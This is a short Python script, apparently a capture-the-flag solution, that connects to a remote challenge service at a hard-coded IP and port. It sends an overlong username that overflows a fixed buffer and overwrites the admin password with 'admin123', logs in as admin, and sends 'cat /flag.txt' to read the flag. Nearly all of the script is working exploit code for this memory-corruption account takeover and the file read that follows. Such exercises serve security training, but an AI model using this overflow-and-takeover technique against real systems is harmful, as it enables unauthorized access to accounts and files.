import socket
import time

HOST = '140.113.207.245'
PORT = 30172

def send_byte_by_byte(sock, data, delay=0.01):
    for byte in data:
        sock.send(byte.encode())
        time.sleep(delay)   
   
def send_byte(sock, data, delay=0.05):
    for b in data:
        sock.sendall(bytes([b]))
        time.sleep(delay)
    sock.sendall(b'\n')
         
def recv_until(sock, ending=b'> '):
    data = b""
    while not data.endswith(ending):
        chunk = sock.recv(1)
        if not chunk:
            break
        data += chunk
    # print(data.decode(), end='', flush=True)
    return data


def main():
    s = socket.socket()
    s.connect((HOST, PORT))
    recv_until(s)

    # register
    s.sendall(b'2\n')
    recv_until(s)  # "Enter your username:"

    payload = b'A' * 16 + b'admin123'  # user.username 16, admin.password 8
    send_byte(s, payload)    
    recv_until(s)                    
    s.sendall(b'anything\n')         
    recv_until(s)                  

    s.sendall(b'1\n')                
    recv_until(s)                    
    s.sendall(b'admin\n')           
    recv_until(s)                     
    s.sendall(b'admin123\n')         
    recv_until(s)                   

    s.sendall(b'3\n')              
    recv_until(s)                
    # s.sendall(b'cat /flag.txt\n')   
    send_byte_by_byte(s, 'cat /flag.txt\n')

    flag = s.recv(4096)
    print(flag.decode(errors="ignore"))

    s.close()

if __name__ == '__main__':
    main()
